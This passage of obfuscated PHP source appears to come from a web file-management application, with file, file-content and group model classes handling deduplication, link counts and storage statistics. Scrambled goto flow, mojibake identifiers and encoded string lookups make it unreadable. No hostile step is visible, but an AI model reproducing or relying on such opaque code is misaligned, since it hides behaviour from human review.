˜Œè[$fÆÍ‚Š‘Øæ[28]] = array(array($fÆÍ‚Š‘Øæ[511], $fÆÍ‚Š‘Øæ[1756] . $bŒİˆõë° . $fÆÍ‚Š‘Øæ[1756])); if (count($FÈÎÆ§—£) > 1) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[28]] = array(); foreach ($FÈÎÆ§—£ as $Bá¢š½ô§£) { if (!trim($Bá¢š½ô§£)) { continue; } $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[28]][] = array($fÆÍ‚Š‘Øæ[511], $fÆÍ‚Š‘Øæ[1756] . trim($Bá¢š½ô§£) . $fÆÍ‚Š‘Øæ[1756]); } } } return $a¨¬— ˜Œè; goto cô³ƒª×ôÆ; A¬‡àÕ ØÆ: $fÆÍ‚Š‘Øæ =& $_SERVER[Ïº«‚ßèÔˆø]; $a¨¬— ˜Œè = array(); if (isset($C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[705]]) && $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[705]]) { $a¨¬— ˜Œè[$fÆÍ‚Š‘Øæ[84]] = array($fÆÍ‚Š‘Øæ[1926], $C¼šäÍ‘Œ»[$fÆÍ‚Š‘Øæ[705]]); } goto D‰îÜù¯è; cô³ƒª×ôÆ: } } goto DÕ¹„×©¦; eÄÔ¿Ò£Ä: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\x69\154\x65\x5f\x63\x6f\x6e\x74\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\x54\151\155\145", "\164\151\155\x65", "\x69\156\163\145\x72\164", "\146\165\156\143\164\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\154\145\x4e\x61\x6d\145" => "\x69\157\137\146\151\154\x65\x5f\155\145\164\x61", "\x6d\x65\164\141\x46\x69\x65\154\x64" => "\x66\151\x6c\145\111\104"); public function fileInfo($bÈ¥šêœ¸) { $A„»Ú×´óø =& $_SERVER[Ïº«‚ßèÔˆø]; static $eŒˆ­Ç×” = array(); if (!isset($eŒˆ­Ç×”[$bÈ¥šêœ¸])) { $A°Ú×ĞëºÁ = $A„»Ú×´óø[1715]; $C¶æô‹ªÛ = Model($A„»Ú×´óø[448])->field($A°Ú×ĞëºÁ)->where(array($A„»Ú×´óø[446] => $bÈ¥šêœ¸))->find(); $eŒˆ­Ç×”[$bÈ¥šêœ¸] = $C¶æô‹ªÛ; } return $eŒˆ­Ç×”[$bÈ¥šêœ¸]; } public function addFileByContent($CËÓƒó ¢á = '', $eÓ¾Ê­Íƒ‘ = '') { goto DÆµ‘µÌ»; a³Ò¼Ãß×¢: $BÛ×çïÁ¡Õ = $dœ½Ïé®—œ . $f¡Ø‹ßÃÔè[1717] . rand_string(16); file_put_contents($BÛ×çïÁ¡Õ, $CËÓƒó ¢á); $A­¼Ç¼“ŒÀ = $this->addFile($BÛ×çïÁ¡Õ, $eÓ¾Ê­Íƒ‘, !0); goto e¶¦Ò˜Ñ»µ; e¶¦Ò˜Ñ»µ: if (file_exists($BÛ×çïÁ¡Õ)) { @unlink($BÛ×çïÁ¡Õ); } return $A­¼Ç¼“ŒÀ; goto e‘£ÀÁ•ÚÆ; DÆµ‘µÌ»: $f¡Ø‹ßÃÔè =& $_SERVER[Ïº«‚ßèÔˆø]; $dœ½Ïé®—œ = TEMP_PATH . $f¡Ø‹ßÃÔè[1716]; if (!is_dir($dœ½Ïé®—œ)) { mk_dir($dœ½Ïé®—œ); } goto a³Ò¼Ãß×¢; e‘£ÀÁ•ÚÆ: } public function createFileName($Bğ´æ¯ä, $E“–Ş¾‚Ø = false, $EíÜ³º° = false) { goto EÚ¸‚±¨œÍ; Bäè¸ğøãß: if (!$EÈ•ª—©äô && !Cache::get($FàµĞ›ïë)) { $EÈ•ª—©äô = !0; $DĞš›®¯°ò = IO::mkdir($d½‰İã¨‚‡); if (!IO::exist($DĞš›®¯°ò . $C³ğÔ©Ù¼†[745])) { IO::mkfile($DĞš›®¯°ò . $C³ğÔ©Ù¼†[745]); } Cache::set($FàµĞ›ïë, 1, 3600 * 2); } return $D‚è´ç¶Ğß; goto Eâ¥®åë; CòÚš²™«: $d½‰İã¨‚‡ = $Dõ®ê…”ó×->pathFather($D‚è´ç¶Ğß); static $EÈ•ª—©äô = false; $FàµĞ›ïë = $C³ğÔ©Ù¼†[1718] . md5($d½‰İã¨‚‡); goto Bäè¸ğøãß; EÚ¸‚±¨œÍ: $C³ğÔ©Ù¼† =& $_SERVER[Ïº«‚ßèÔˆø]; $Dõ®ê…”ó× = IO::init($C³ğÔ©Ù¼†[8]); $D‚è´ç¶Ğß = $this->makeFilePath($Bğ´æ¯ä, $Dõ®ê…”ó×, $E“–Ş¾‚Ø, $EíÜ³º°); goto CòÚš²™«; Eâ¥®åë: } public function makeFilePath($a¡×­ —Â©, $A±óâ³ƒÃ˜, $fÌÚ¿²÷„ = false, $eÆãÀ„‰é = false) { goto B ® ‹°åØ; B ® ‹°åØ: $C¶ƒ‡İ‹±Ù =& $_SERVER[Ïº«‚ßèÔˆø]; $CÛÍíá£éŸ = Model($C¶ƒ‡İ‹±Ù[714])->get($C¶ƒ‡İ‹±Ù[1719]); $b©™ËâÑÑ = KodIO::defaultIO() . date($C¶ƒ‡İ‹±Ù[1720]); goto bƒíçôÚ–î; bƒíçôÚ–î: $eá‚ÆË¹Ÿ = $b©™ËâÑÑ . rand_string(5) . short_id(100); $a¡×­ —Â© = str_replace($C¶ƒ‡İ‹±Ù[8], $C¶ƒ‡İ‹±Ù[71], KodIO::clear($a¡×­ —Â©)); $E‚Ä¹—ÅÑÁ = $A±óâ³ƒÃ˜->ext($a¡×­ —Â©); goto Bß“ß¦Æ·Õ; Bß“ß¦Æ·Õ: if (!$a¡×­ —Â©) { $CÛÍíá£éŸ = $C¶ƒ‡İ‹±Ù[1721]; } switch ($CÛÍíá£éŸ) { case $C¶ƒ‡İ‹±Ù[1722]: $eá‚ÆË¹Ÿ = $eá‚ÆË¹Ÿ . $C¶ƒ‡İ‹±Ù[95] . $A±óâ³ƒÃ˜->ext($a¡×­ —Â©); if ($E‚Ä¹—ÅÑÁ == $C¶ƒ‡İ‹±Ù[1661]) { $eá‚ÆË¹Ÿ .= $C¶ƒ‡İ‹±Ù[1410]; } break; case $C¶ƒ‡İ‹±Ù[1723]: goto Aí°Ä¨¼Ğƒ; Aí°Ä¨¼Ğƒ: $cˆÈâĞÒ¿È = Model($C¶ƒ‡İ‹±Ù[714])->get($C¶ƒ‡İ‹±Ù[715]); $d¨å£ä‰†Õ = substr(md5($C¶ƒ‡İ‹±Ù[716] . $cˆÈâĞÒ¿È . date($C¶ƒ‡İ‹±Ù[695])), 0, 8); $bÏ¹·ë°ô¢ = KodIO::defaultDriver(); goto f‘¥ŒÌ¹ÂÔ; b¶‡§³­ãº: CacheLock::lock($bîÏ§³–Íµ); $eá‚ÆË¹Ÿ = $b©™ËâÑÑ . $a¡×­ —Â©; if (IO::exist($b©™ËâÑÑ . $a¡×­ —Â©)) { $f™­Ù°‡ê = substr($a¡×­ —Â©, 0, strlen($a¡×­ —Â©) - strlen($E‚Ä¹—ÅÑÁ)); $Cšîƒñ¶»Ã = $eÆãÀ„‰é ? substr($eÆãÀ„‰é, 0, 5) : ($fÌÚ¿²÷„ ? substr($fÌÚ¿²÷„, 0, 5) : rand_string(5)); $eá‚ÆË¹Ÿ = $b©™ËâÑÑ . $f™­Ù°‡ê . $Cšîƒñ¶»Ã . $C¶ƒ‡İ‹±Ù[95] . $E‚Ä¹—ÅÑÁ; } goto E×¿ºÈ‰é; E×¿ºÈ‰é: if (IO::isTypeObject($eá‚ÆË¹Ÿ) && !IO::isUploadServer($eá‚ÆË¹Ÿ)) { if (IO::exist($eá‚ÆË¹Ÿ)) { return $eá‚ÆË¹Ÿ; } $E›ŸÙ£Ã» = IO::setContent($eá‚ÆË¹Ÿ, $C¶ƒ‡İ‹±Ù[33]); if (!$E›ŸÙ£Ã») { show_json($C¶ƒ‡İ‹±Ù[1726], !1); } } CacheLock::unlock($bîÏ§³–Íµ); break; goto FÉÓ±„Œ±‚; f‘¥ŒÌ¹ÂÔ: $b©™ËâÑÑ = $C¶ƒ‡İ‹±Ù[1106] . $bÏ¹·ë°ô¢[$C¶ƒ‡İ‹±Ù[392]] . $C¶ƒ‡İ‹±Ù[400] . date($C¶ƒ‡İ‹±Ù[1724]) . $d¨å£ä‰†Õ . $C¶ƒ‡İ‹±Ù[8]; if ($E‚Ä¹—ÅÑÁ == $C¶ƒ‡İ‹±Ù[1661]) { $a¡×­ —Â© .= $C¶ƒ‡İ‹±Ù[1410]; } $bîÏ§³–Íµ = $C¶ƒ‡İ‹±Ù[1725] . $b©™ËâÑÑ . $a¡×­ —Â©; goto b¶‡§³­ãº; FÉÓ±„Œ±‚: case $C¶ƒ‡İ‹±Ù[1721]: break; default: break; } return $eá‚ÆË¹Ÿ; goto Còô‘ÔÓö¨; Còô‘ÔÓö¨: } public function addFileByRemote($c“†ØöäÚ, $fòİ„· Úƒ, $EÊâñÂ·¦‘ = array()) { goto Fõöƒã¬•í; dïÉ¶ÉŒÜ: $fÑ‰é¹Ê“ = IO::hashMd5($c“†ØöäÚ, $C×Ò¦É‰ˆ²); $b†³ŸŒ¸ÔÌ = KodIO::defaultDriver(); $CµˆºÄ—±¦ = array($CŸÁ±ìæÀ¦[547] => IO::size($c“†ØöäÚ), $CŸÁ±ìæÀ¦[1727] => 1, $CŸÁ±ìæÀ¦[411] => $fòİ„· Úƒ, $CŸÁ±ìæÀ¦[765] => $b†³ŸŒ¸ÔÌ[$CŸÁ±ìæÀ¦[392]], $CŸÁ±ìæÀ¦[412] => $c“†ØöäÚ, $CŸÁ±ìæÀ¦[1728] => $EÊâñÂ·¦‘[$CŸÁ±ìæÀ¦[171]] ? $EÊâñÂ·¦‘[$CŸÁ±ìæÀ¦[171]] : IO::hashSimple($c“†ØöäÚ), $CŸÁ±ìæÀ¦[1729] => $fÑ‰é¹Ê“ ? $fÑ‰é¹Ê“ : $C×Ò¦É‰ˆ²); goto aÁß·¹ª‘Î; aÁß·¹ª‘Î: if ($eİ§”±§®§ = $this->addFileCheckExist($CµˆºÄ—±¦[$CŸÁ±ìæÀ¦[171]], $CµˆºÄ—±¦[$CŸÁ±ìæÀ¦[170]], $CµˆºÄ—±¦[$CŸÁ±ìæÀ¦[78]])) { return $eİ§”±§®§; } return $this->addFileData($CµˆºÄ—±¦); goto f¾»”åË‘¥; Fõöƒã¬•í: $CŸÁ±ìæÀ¦ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!IO::exist($c“†ØöäÚ)) { return !1; } $C×Ò¦É‰ˆ² = $EÊâñÂ·¦‘[$CŸÁ±ìæÀ¦[170]] ? $EÊâñÂ·¦‘[$CŸÁ±ìæÀ¦[170]] : $CŸÁ±ìæÀ¦[33]; goto dïÉ¶ÉŒÜ; f¾»”åË‘¥: } private function addFileData($cÙ´õğË‹Ş) { $dğˆÂìŠ¢Á =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$cÙ´õğË‹Ş) { return !1; } $cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[78]] = intval($cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[78]]); if (!$cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[78]] && strlen($cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[171]]) > 32) { $cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[78]] = intval(substr($cÙ´õğË‹Ş[$dğˆÂìŠ¢Á[171]], 32)); } $bšìùÚ¥ÈŠ = $this->add($cÙ´õğË‹Ş); return $this->find($bšìùÚ¥ÈŠ); } public function addFile($DÔ¼ˆ– é», $c´”È×Î¨Ó, $BÚÑÇİÒå = false) { goto D¡†éóò¤; D¡†éóò¤: $C™ŠáŠò»¿ = IO::hashSimple($DÔ¼ˆ– é»); $A²àî²íÙ = IO::hashMd5($DÔ¼ˆ– é»); $e›³Àâ­¾õ = IO::size($DÔ¼ˆ– é»); goto dó÷¯ìº®«; dó÷¯ìº®«: $A›ÌæÎî˜ = $_SERVER[Ïº«‚ßèÔˆø][1730] . $A²àî²íÙ; CacheLock::lock($A›ÌæÎî˜); if ($f‹ÁØÂÅéã = $this->addFileCheckExist($C™ŠáŠò»¿, $A²àî²íÙ, $e›³Àâ­¾õ)) { CacheLock::unlock($A›ÌæÎî˜); return $f‹ÁØÂÅéã; } goto D•ÏéñåÅã; D•ÏéñåÅã: $dç¦ŒÍàÌ³ = $this->addFileMake($DÔ¼ˆ– é», $e›³Àâ­¾õ, $C™ŠáŠò»¿, $A²àî²íÙ, $c´”È×Î¨Ó, $BÚÑÇİÒå); $Bóİ’Ë˜” = $this->addFileData($dç¦ŒÍàÌ³); CacheLock::unlock($A›ÌæÎî˜); goto D“’¿†àóÈ; D“’¿†àóÈ: return $Bóİ’Ë˜”; goto e•Áå—¾Ö‘; e•Áå—¾Ö‘: } public function addFileMake($f¯“ä×‹ù», $Fì·‡ÑŞŞ«, $AïÛŸ³ÓåÕ, $bã…ÍŒ»‚³, $F°ÆÊèğˆŸ, $EÜ´…Ó‚ğ) { goto aê÷ÄÌºåÏ; DÑõÑãœø: $EÈÅäÎ¾´ = KodIO::defaultDriver(); $fà„©²Ç¿à = array($F î”¤ËÅ¸[547] => $Fì·‡ÑŞŞ«, $F î”¤ËÅ¸[1727] => 1, $F î”¤ËÅ¸[411] => $F°ÆÊèğˆŸ, $F î”¤ËÅ¸[765] => $EÈÅäÎ¾´[$F î”¤ËÅ¸[392]], $F î”¤ËÅ¸[412] => $e·‡‹³Ú‡É, $F î”¤ËÅ¸[1728] => $AïÛŸ³ÓåÕ, $F î”¤ËÅ¸[1729] => $bã…ÍŒ»‚³); return $fà„©²Ç¿à; goto eÎÑ©ˆÃ; aê÷ÄÌºåÏ: $F î”¤ËÅ¸ =& $_SERVER[Ïº«‚ßèÔˆø]; $e·‡‹³Ú‡É = $this->createFileName($F°ÆÊèğˆŸ, $AïÛŸ³ÓåÕ, $bã…ÍŒ»‚³); $FË»Î»Ããí = get_path_father($e·‡‹³Ú‡É); goto Aà†áÍŒÛ; Aà†áÍŒÛ: $CæÚ¬œÛê¿ = get_path_this($e·‡‹³Ú‡É); if ($EÜ´…Ó‚ğ) { $D¤è³Ëí“ = IO::move($f¯“ä×‹ù», $FË»Î»Ããí, !1, $CæÚ¬œÛê¿); } else { $D¤è³Ëí“ = IO::copy($f¯“ä×‹ù», $FË»Î»Ããí, !1, $CæÚ¬œÛê¿); } if (!$D¤è³Ëí“) { return !1; } goto DÑõÑãœø; eÎÑ©ˆÃ: } public function addFileCheckExist($E…Ù¸ÃŸµç, $FŸøñË‡§Š, $EÄªôåëö¸) { $F¡”˜¥¨ö =& $_SERVER[Ïº«‚ßèÔˆø]; $fÑçÀ…›‰ = $this->findByHash($E…Ù¸ÃŸµç, $FŸøñË‡§Š); if (!$fÑçÀ…›‰) { return !1; } $dÄª‚™Ú«Õ = array($F¡”˜¥¨ö[1727] => intval($fÑçÀ…›‰[$F¡”˜¥¨ö[1731]]) + 1, $F¡”˜¥¨ö[547] => $EÄªôåëö¸); $this->where(array($F¡”˜¥¨ö[446] => $fÑçÀ…›‰[$F¡”˜¥¨ö[445]]))->save($dÄª‚™Ú«Õ); return $fÑçÀ…›‰; } public function remove($AŒ«…î­ÕÛ) { $this->linkCountChange($AŒ«…î­ÕÛ, !1); $this->clearEmpty(); return !0; } public function linkAdd($DÌèŠêß) { $this->linkCountChange($DÌèŠêß, !0); } public function linkCountChange($Aïîëƒí’Ì, $e£»Û³Ç¯) { goto d±ŠÇğãÅŸ; aÃö›¼‹æÊ: foreach ($DÌŸ‚… as $B‹ğ’ÕÑÌ => $A“ìÔ´Ö³ù) { $Dë¢Á¸ØÄÌ = $A“ìÔ´Ö³ù . $d¶œ‡ù·åó[33]; if (!$Eƒ¬ÕÉ­šÃ[$Dë¢Á¸ØÄÌ]) { $Eƒ¬ÕÉ­šÃ[$Dë¢Á¸ØÄÌ] = array(); } $Eƒ¬ÕÉ­šÃ[$Dë¢Á¸ØÄÌ][] = $B‹ğ’ÕÑÌ; } foreach ($Eƒ¬ÕÉ­šÃ as $A“ìÔ´Ö³ù => $A‡·ïì½Ïå) { if (!$A‡·ïì½Ïå) { continue; } $A“ìÔ´Ö³ù = $e£»Û³Ç¯ ? $A“ìÔ´Ö³ù : -intval($A“ìÔ´Ö³ù); $BÜ¨Ò½‰ = array($d¶œ‡ù·åó[445] => array($d¶œ‡ù·åó[7], $A‡·ïì½Ïå)); if ($A“ìÔ´Ö³ù < 0) { $BÜ¨Ò½‰[$d¶œ‡ù·åó[1731]] = array($d¶œ‡ù·åó[956], abs($A“ìÔ´Ö³ù)); } $this->where($BÜ¨Ò½‰)->setAdd($d¶œ‡ù·åó[1731], $A“ìÔ´Ö³ù); } goto C–·×áÈ¿; bœ±™òøĞ: $DÌŸ‚… = array(); foreach ($Aïîëƒí’Ì as $B‹ğ’ÕÑÌ) { $Dë¢Á¸ØÄÌ = $B‹ğ’ÕÑÌ . $d¶œ‡ù·åó[33]; if (!$DÌŸ‚…[$Dë¢Á¸ØÄÌ]) { $DÌŸ‚…[$Dë¢Á¸ØÄÌ] = 0; } $DÌŸ‚…[$Dë¢Á¸ØÄÌ]++; } $Eƒ¬ÕÉ­šÃ = array(); goto aÃö›¼‹æÊ; d±ŠÇğãÅŸ: $d¶œ‡ù·åó =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$Aïîëƒí’Ì) { return; } if (!is_array($Aïîëƒí’Ì)) { $Aïîëƒí’Ì = array($Aïîëƒí’Ì); } goto bœ±™òøĞ; C–·×áÈ¿: } public function findByHash($FŠØã£Å¶¡, $e¢ª÷¨øè½ = false) { $a¸‹ÉÒºÒ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$FŠØã£Å¶¡ && !$e¢ª÷¨øè½) { return !1; } $bŞˆöÔ“Õ = array($a¸‹ÉÒºÒ[1728] => $FŠØã£Å¶¡); if ($e¢ª÷¨øè½) { $bŞˆöÔ“Õ = array($a¸‹ÉÒºÒ[1729] => $e¢ª÷¨øè½); } return $this->order($a¸‹ÉÒºÒ[1732])->where($bŞˆöÔ“Õ)->find(); } public function clearEmpty($FÇ‚»‡³š­ = 0) { goto dŒ’÷¤–î; BÏÑ¥¤³‰: $Bç™ÉÎÀÉâ = $this->where($cˆ­ƒ£ÁÏŞ)->select(); if (!$Bç™ÉÎÀÉâ) { return; } $C‚×…õ‰Ó = new Task($dµ×šá††Ğ[1734], $dµ×šá††Ğ[33], count($Bç™ÉÎÀÉâ)); goto F•Î¢¶’´; F•Î¢¶’´: foreach ($Bç™ÉÎÀÉâ as $fô‡ô‰‡êİ) { $C‚×…õ‰Ó->update(1); $this->resetFile($fô‡ô‰‡êİ); } $C‚×…õ‰Ó->end(); goto D”µöáŠªˆ; dŒ’÷¤–î: $dµ×šá††Ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $b„Ú…¢áè = time() - 3600 * 24 * $FÇ‚»‡³š­; $cˆ­ƒ£ÁÏŞ = $dµ×šá††Ğ[1733] . $b„Ú…¢áè; goto BÏÑ¥¤³‰; D”µöáŠªˆ: } public function resetFile($dØáö»‚ƒò) { goto F’‹–¼çÅ–; aŠğãŒÍŒ¦: if ($dØáö»‚ƒò[$eø†Ÿñ»ßõ[1731]] != $Fç†áå‚Øš) { $this->where($CˆƒÆ‘‰™)->save(array($eø†Ÿñ»ßõ[1727] => $Fç†áå‚Øš)); } goto Bªê…œÔÖ“; Bğ‚‘Ö§Ñî: $D ‡ŸÑ‹²Â = Model($eø†Ÿñ»ßõ[1735])->where($CˆƒÆ‘‰™)->count(); $Fç†áå‚Øš = intval($C”æØ‡éî ) + intval($D ‡ŸÑ‹²Â); if ($Fç†áå‚Øš == 0) { IO::remove($dØáö»‚ƒò[$eø†Ÿñ»ßõ[76]]); Model($eø†Ÿñ»ßõ[1736])->delete($dØáö»‚ƒò[$eø†Ÿñ»ßõ[445]]); $this->where($CˆƒÆ‘‰™)->delete(); $this->metaSet($dØáö»‚ƒò[$eø†Ÿñ»ßõ[445]], null, null); return; } goto aŠğãŒÍŒ¦; F’‹–¼çÅ–: $eø†Ÿñ»ßõ =& $_SERVER[Ïº«‚ßèÔˆø]; $CˆƒÆ‘‰™ = array($eø†Ÿñ»ßõ[446] => $dØáö»‚ƒò[$eø†Ÿñ»ßõ[445]]); $C”æØ‡éî  = Model($eø†Ÿñ»ßõ[1187])->where($CˆƒÆ‘‰™)->count(); goto Bğ‚‘Ö§Ñî; Bªê…œÔÖ“: } public function storageInfo($cÔÅ§½¯êË = false) { goto AàÁìÍ¡Ÿ‘; AàÁìÍ¡Ÿ‘: $c†Ü”Ó­î¼ =& $_SERVER[Ïº«‚ßèÔˆø]; $A‰°İ¼¨µ = $this->count() + 0.0; $b—‡ÛÖ”ù– = 0; goto AÃïâ¹ÊŸ–; DÄíæ«¤Ç: for ($aöŠ¯¿®Ğ = 0; $aöŠ¯¿®Ğ < $A‰°İ¼¨µ; $aöŠ¯¿®Ğ = $aöŠ¯¿®Ğ + $F¯åÔÜù‚) { $f‘½ß»åØ² = $this->limit($aöŠ¯¿®Ğ, $aöŠ¯¿®Ğ + $F¯åÔÜù‚)->select(); foreach ($f‘½ß»åØ² as $b†æëÃå) { $b¬¡¢¬Ä += $b†æëÃå[$c†Ü”Ó­î¼[78]] * $b†æëÃå[$c†Ü”Ó­î¼[1731]]; $b—‡ÛÖ”ù– += $b†æëÃå[$c†Ü”Ó­î¼[78]] * ($b†æëÃå[$c†Ü”Ó­î¼[1731]] - 1); $DòÇÏëõ¼ß += $b†æëÃå[$c†Ü”Ó­î¼[1731]]; } } $eÅÈ™ŠæŒ = array($c†Ü”Ó­î¼[1737] => $b¬¡¢¬Ä, $c†Ü”Ó­î¼[1738] => $b—‡ÛÖ”ù–, $c†Ü”Ó­î¼[1739] => $b—‡ÛÖ”ù– / $b¬¡¢¬Ä, $c†Ü”Ó­î¼[82] => $A‰°İ¼¨µ, $c†Ü”Ó­î¼[1740] => $DòÇÏëõ¼ß); return $eÅÈ™ŠæŒ; goto DÈ÷¦×˜°£; AÃïâ¹ÊŸ–: $b¬¡¢¬Ä = 1; $DòÇÏëõ¼ß = 0; $F¯åÔÜù‚ = 5000; goto DÄíæ«¤Ç; DÈ÷¦×˜°£: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\x70"; protected $tableMeta = array("\164\141\142\154\x65\116\141\x6d\145" => "\x67\x72\157\x75\160\x5f\x6d\145\164\141", "\155\x65\x74\141\106\x69\x65\154\x64" => "\x67\x72\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($D­‚ËšŸ©ê) { $f­İÇÃ±« =& $_SERVER[Ïº«‚ßèÔˆø]; return array($f­İÇÃ±«[1741] => array($D­‚ËšŸ©ê[0], $f­İÇÃ±«[1742]), $f­İÇÃ±«[1743] => array($D­‚ËšŸ©ê[0], $f­İÇÃ±«[1742])); } protected function getInfo($Cá©Õóƒ) { $B‰‘îŒî¸º = $this->getInfoSimple($Cá©Õóƒ); if (!$B‰‘îŒî¸º) { return !1; } return $this->_listDataApplyItem($B‰‘îŒî¸º); } protected function getInfoSimple($EÆ é‚††ï, $eƒÂÓå±¹¡ = false) { $eô¥–ÊÄÛï =& $_SERVER[Ïº«‚ßèÔˆø]; if ($eƒÂÓå±¹¡) { $d¢Æˆ®æè‡ = array($eô¥–ÊÄÛï[1671] => intval($EÆ é‚††ï)); $A–Üò·²¨Ã = $this->where($d¢Æˆ®æè‡)->find(); return is_array($A–Üò·²¨Ã) ? $A–Üò·²¨Ã : array(); } return $this->cacheFunctionGet($eô¥–ÊÄÛï[1744], $EÆ é‚††ï); } protected function groupAdd($EÂ‹ˆ¹¿œˆ) { goto EŸéÜ­”‘è; b·î¬î: if (isset($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1747]])) { $this->metaSet($BÏ‘á‰°©‘, array($aòÆ ÷‡–[1747] => $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1747]], $aòÆ ÷‡–[1748] => $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1748]])); unset($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1747]]); unset($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1748]]); } Model($aòÆ ÷‡–[1187])->groupRootAdd($BÏ‘á‰°©‘); return $BÏ‘á‰°©‘; goto c‹ëŠÓğÂ; EŸéÜ­”‘è: $aòÆ ÷‡– =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[476]] && isset($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]]) && $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]] == 1) { if ($C¯‹ÌÛ»½… = $this->getInfoSimple($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]], !0)) { return $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]]; } } else { $C¯‹ÌÛ»½… = $this->getInfoSimple($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[476]]); if (!$C¯‹ÌÛ»½…) { return !1; } } $c¾š‹ñì†ë = $aòÆ ÷‡–[497]; goto b¨èõŸ—Œá; C»Õö´îé¿: if (!empty($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]])) { $Aˆêº•á˜¨[$aòÆ ÷‡–[1671]] = $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1671]]; } $BÏ‘á‰°©‘ = $this->add($Aˆêº•á˜¨); $this->setNamePinyin($BÏ‘á‰°©‘, $Aˆêº•á˜¨[$aòÆ ÷‡–[28]]); goto b·î¬î; b¨èõŸ—Œá: if ($C¯‹ÌÛ»½…[$aòÆ ÷‡–[485]]) { $c¾š‹ñì†ë = $C¯‹ÌÛ»½…[$aòÆ ÷‡–[485]] . $C¯‹ÌÛ»½…[$aòÆ ÷‡–[1671]] . $aòÆ ÷‡–[47]; } $Aˆêº•á˜¨ = array($aòÆ ÷‡–[411] => $this->groupNameAuto($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[476]], $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[28]]), $aòÆ ÷‡–[393] => $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[476]], $aòÆ ÷‡–[552] => $c¾š‹ñì†ë, $aòÆ ÷‡–[1745] => $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1655]], $aòÆ ÷‡–[1746] => 0, $aòÆ ÷‡–[1675] => 0); if (isset($EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1694]])) { $Aˆêº•á˜¨[$aòÆ ÷‡–[1694]] = $EÂ‹ˆ¹¿œˆ[$aòÆ ÷‡–[1694]]; } else { $Aï›çîÉÕ = $this->max($aòÆ ÷‡–[1694]); if (!$Aï›çîÉÕ) { $Aï›çîÉÕ = 0; } $Aˆêº•á˜¨[$aòÆ ÷‡–[1694]] = $Aï›çîÉÕ + 1; } goto C»Õö´îé¿; c‹ëŠÓğÂ: } protected function groupEdit($E«Ì¬¾²îî, $EÔ½…Çš¾İ) { goto e ™×µ‹øÍ; F»²ô¦Îã¶: if (isset($EÔ½…Çš¾İ[$e¬åôšĞ†õ[28]]) && $EÔ½…Çš¾İ[$e¬åôšĞ†õ[28]] != $cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[28]]) { $this->_clearChildrenCache($cƒ¨Í¾Ğ¨İ); } return $this->where(array($e¬åôšĞ†õ[1749] => $E«Ì¬¾²îî))->save($EÔ½…Çš¾İ); goto Cäğ°æÂø; e ™×µ‹øÍ: $e¬åôšĞ†õ =& $_SERVER[Ïº«‚ßèÔˆø]; $cƒ¨Í¾Ğ¨İ = $this->getInfoSimple($E«Ì¬¾²îî); if (!$cƒ¨Í¾Ğ¨İ) { return !1; } goto aÒœË’öØò; aÒœË’öØò: if (!empty($EÔ½…Çš¾İ[$e¬åôšĞ†õ[476]])) { $fïØ«â³ì± = $this->getInfoSimple($EÔ½…Çš¾İ[$e¬åôšĞ†õ[476]]); if (!$fïØ«â³ì±) { return !1; } if ($cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[1671]] == $fïØ«â³ì±[$e¬åôšĞ†õ[1671]]) { return !1; } if ($EÔ½…Çš¾İ[$e¬åôšĞ†õ[476]] != $cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[476]]) { if ($fïØ«â³ì±[$e¬åôšĞ†õ[485]] !== $cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[485]] && strpos($fïØ«â³ì±[$e¬åôšĞ†õ[485]], $cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[485]] . $cƒ¨Í¾Ğ¨İ[$e¬åôšĞ†õ[1671]] . $e¬åôšĞ†õ[47]) === 0) { return !1; } $EÔ½…Çš¾İ[$e¬åôšĞ†õ[552]] = $fïØ«â³ì±[$e¬åôšĞ†õ[485]] . $EÔ½…Çš¾İ[$e¬åôšĞ†õ[476]] . $e¬åôšĞ†õ[47]; $this->_changeChildLevel($cƒ¨Í¾Ğ¨İ, $fïØ«â³ì±); } } if (isset($EÔ½…Çš¾İ[$e¬åôšĞ†õ[28]])) { $this->setNamePinyin($E«Ì¬¾²îî, $EÔ½…Çš¾İ[$e¬åôšĞ†õ[28]]); } if (isset($EÔ½…Çš¾İ[$e¬åôšĞ†õ[1747]])) { $this->metaSet($E«Ì¬¾²îî, 